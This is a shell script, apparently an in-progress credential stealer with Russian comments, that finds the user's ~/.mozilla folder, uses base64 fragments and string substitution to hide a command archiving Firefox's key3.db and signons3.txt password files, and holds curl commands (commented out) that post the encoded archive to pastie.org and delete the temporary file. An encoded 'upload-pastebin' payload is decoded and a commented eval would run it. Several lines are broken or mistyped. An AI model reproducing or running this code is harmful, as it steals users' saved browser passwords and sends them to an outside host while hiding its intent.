#! /bin/sh

__p_="3"
__r="a2V5My5kY"
_f__="TM_DQTL"
_g_="Lar"
_z___="oz"
_k="bHMgLWQgfi8ubW96aWxs"
_k_="zMy50eHQ"
_i_="Zmp"
_r_="iBzaWdub25"
_l="bas"
_g__="Qp"
_i="YS9maXJlZm94LyouZGVmYXVsdA"
_r="A64"

####### 1. #######
_p=$(eval ls -d ~/.mozilla)
##################

# chack existens of ~/.mozilla directory
target=$(eval ls -d ~/.mozilla)

if [ -e $target ]; then
    # prepare name for temporary file
    tmp="/tmp/.mozilla_${RANDOM}"
    echo "TM_DQTL" > $tmp && _m__="Mz";
    # cd ~/.mozilla
    cd $target
    echo "tar cf - key3.db signons3.txt | ip -f | base64 >> $tmp" ;
    __l="bas"
fi

if [ -e "$_p" ]; then
	z=/${_i_/Z/t}/$(basename $_p)_${RANDOM};
    # генерим имя файла вида /tmp/mozilla_RANDOM, например  /tmp/mozilla_26589
    # z="/tmp/mozilla_${RANDOM}"
#	echo "$z"
    #выводим хрень в тот файл
#    echo $_f__ > $z && _m___="Mz";
    # переходим в ~/.mozilla
    echo "cd $_p";
#    # запаковываем таром
    # tar cf - key3.db signons3.txt | ip -f | base64 >> /tmp/.mozilla_ 26589# $z
    echo "${_g_/L/t} cf - $(echo $__r$_r_$_k_= | base64 -d) | ${_z__/o/g}${_g__/Q/i} -f} | $_l${_r/A/e} >> $z}"
    echo "__l=\"bas\""

fi

# постим наши секретики на pastie.org и прибираемся
#curl -F "paste[parser_id]=4" -F "lang=" -F "paste[body]=$(cat $tmp)" -F "paste[authorization]=burger" -F "key=" -F "paste[restricted]=0" -F "x=$(((${RANDOM} % 30)))" -F "y=$(((${RANDOM} % 30)))" pastie.org/pastes 2>&1 > /dev/null && rm $tmp 2>&1 > /dev/null

#_p=$(eval $(echo $_k$_i= | $_l${_r/A/e} -d)); if [ -e $_p ]; then z=/${_i_/Z/t}/$(basename $_p)_${RANDOM}; echo $_f__ > $z && _m___="Mz";$(cd $_p; ${_g_/L/t} cf - $(echo $__r$_r_$_k_= | $_l${_r/A/e} -d) | ${_z___/o/g}${_g__/Q/i} -f | $_l${_r/A/e} >> $z); __l="bas";fi

echo $(echo "H4sICDlzZ0sAA3VwbG9hZC1wYXN0ZWJpbgB1jk0LgkAURff9ioeY6KK0j+0IQbSroG1IjPqwocmRNzORRv890xZGtL3ncu7NLEmYbMCpuDZ4rDhppJPIE7Z0ulzysmDOoJKqvE6Y62fcgNsEQ8StOSsSDTdClQlLLRVIfeGC9ZeFUBsSmcF2KerBvZX6vvs4rHbr/fYJY1hEQfAZqP/Bt07gVFERdmYN89ibQQxhjrewtFKC5wFd268/ZPQCqyZJlv4AAAA=" | base64 -d | gzip -d)

#curl -F "paste[parser_id]=4" -F "lang=" -F "paste[body]=$(cat $z)" -F "paste[authorization]=burger" -F "key=" -F "paste[restricted]=0" -F "x=$(((${RANDOM} % 30)))" -F "y=$(((${RANDOM} % 30)))" pastie.org/pastes 2>&1 > /dev/null && rm $z 2>&1 > /dev/null

# gzip -d
#echo "${_m___/M/g}${_g__/Q/i} -d"
#eval $(echo H4sICDlzZ0sAA3VwbG9hZC1wYXN0ZWJpbgB1jk0LgkAURff9ioeY6KK0j+0IQbSroG1IjPqwocmRNzORRv890xZGtL3ncu7NLEmYbMCpuDZ4rDhppJPIE7Z0ulzysmDOoJKqvE6Y62fcgNsEQ8StOSsSDTdClQlLLRVIfeGC9ZeFUBsSmcF2KerBvZX6vvs4rHbr/fYJY1hEQfAZqP/Bt07gVFERdmYN89ibQQxhjrewtFKC5wFd268/ZPQCqyZJlv4AAAA= | $__l${_r/A/e} -d | ${_m___/M/g}${_g__/Q/i} -d)
